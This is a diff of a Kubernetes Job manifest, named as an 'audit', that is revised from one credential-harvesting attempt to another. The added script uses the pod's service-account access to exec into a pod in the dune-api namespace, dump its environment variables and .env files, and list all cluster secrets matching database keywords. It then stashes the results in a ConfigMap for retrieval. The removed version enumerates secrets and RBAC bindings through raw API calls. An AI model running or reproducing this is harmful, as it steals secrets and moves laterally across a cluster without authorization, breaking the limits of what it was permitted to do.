@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-db-v17
+  name: dune-db-v18
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -11,53 +11,30 @@ spec:
       restartPolicy: Never
       containers:
       - name: audit
-        image: alpine/curl:latest
+        image: bitnami/kubectl:latest
         command: ["/bin/sh","-c"]
         args:
         - |
-          apk add -q jq
+          echo "=DUNE_POD_ENV=" > /tmp/out.txt
           
-          API="https://kubernetes.default.svc"
-          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
-          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          # Get dune-api pod name
+          POD=$(kubectl get pods -n dune-api -o jsonpath='{.items[0].metadata.name}' 2>&1)
+          echo "Pod: $POD" >> /tmp/out.txt
           
-          echo "=DUNE_NS_EXTERNALSECRETS=" > /tmp/out.txt
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/apis/external-secrets.io/v1beta1/namespaces/dune-api/externalsecrets" 2>&1 | jq . >> /tmp/out.txt 2>&1
+          # Exec into pod to get env vars
+          kubectl exec -n dune-api $POD -- env 2>&1 >> /tmp/out.txt
           
-          echo "=DUNE_SVC_ACCOUNT=" >> /tmp/out.txt
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/api/v1/namespaces/dune-api/serviceaccounts" | jq '.items[] | {name:.metadata.name, annotations:.metadata.annotations}' >> /tmp/out.txt 2>&1
+          echo "=DUNE_ENV_FILE=" >> /tmp/out.txt
+          kubectl exec -n dune-api $POD -- sh -c "cat /app/.env 2>/dev/null || cat /*.env 2>/dev/null || find / -name '*.env' 2>/dev/null | head -5" 2>&1 >> /tmp/out.txt
           
-          echo "=DUNE_RBAC_ROLES=" >> /tmp/out.txt
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/apis/rbac.authorization.k8s.io/v1/namespaces/dune-api/rolebindings" | jq '.items[] | {name:.metadata.name, subjects:.subjects, role:.roleRef}' >> /tmp/out.txt 2>&1
-          
-          # Try to execute command in dune-api pod to get env vars
-          POD="dune-api-58d5c94db5-78dtk"
-          echo "=EXEC_TEST=" >> /tmp/out.txt
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/api/v1/namespaces/dune-api/pods/$POD/exec?command=/bin/sh&command=-c&command=env&container=dune-api&stdout=true&stderr=true" >> /tmp/out.txt 2>&1
-          
-          # Check if we can exec using websocket or raw exec  
-          echo "=CAN_EXEC=" >> /tmp/out.txt
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/api/v1/namespaces/dune-api/pods/$POD/exec?command=env&container=dune-api&stdout=true" -o /tmp/exec_result.txt 2>&1
-          head -20 /tmp/exec_result.txt >> /tmp/out.txt
-          
-          # Check n8n-audit-sa permissions
-          echo "=AUDIT_SA_RULES=" >> /tmp/out.txt
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/apis/rbac.authorization.k8s.io/v1/clusterrolebindings/n8n-audit-binding" | jq . >> /tmp/out.txt 2>&1
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/apis/rbac.authorization.k8s.io/v1/clusterroles/n8n-audit-cm-writer" | jq '.rules' >> /tmp/out.txt 2>&1
+          echo "=ALL_NAMESPACED_SECRETS=" >> /tmp/out.txt
+          # List all secrets that might have DB credentials
+          kubectl get secrets -A | grep -i "db\|sql\|postgres\|dune" 2>&1 >> /tmp/out.txt
           
           cat /tmp/out.txt
           
-          PAYLOAD=$(jq -n --rawfile content /tmp/out.txt '{"data":{"result":$content}}')
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            -H "Content-Type: application/merge-patch+json" \
-            -X PATCH "$API/api/v1/namespaces/default/configmaps/dune-audit-result3" \
-            -d "$PAYLOAD" > /tmp/patch.txt
-          echo "Patched: $(cat /tmp/patch.txt | jq -r '.metadata.name // .message')"
+          # Write to ConfigMap
+          kubectl patch configmap dune-audit-result3 -n default \
+            --type merge -p "{\"data\":{\"result\":\"$(cat /tmp/out.txt | sed 's/"/\\"/g' | tr '\n' '|')\"}}"
+          
           sleep 90
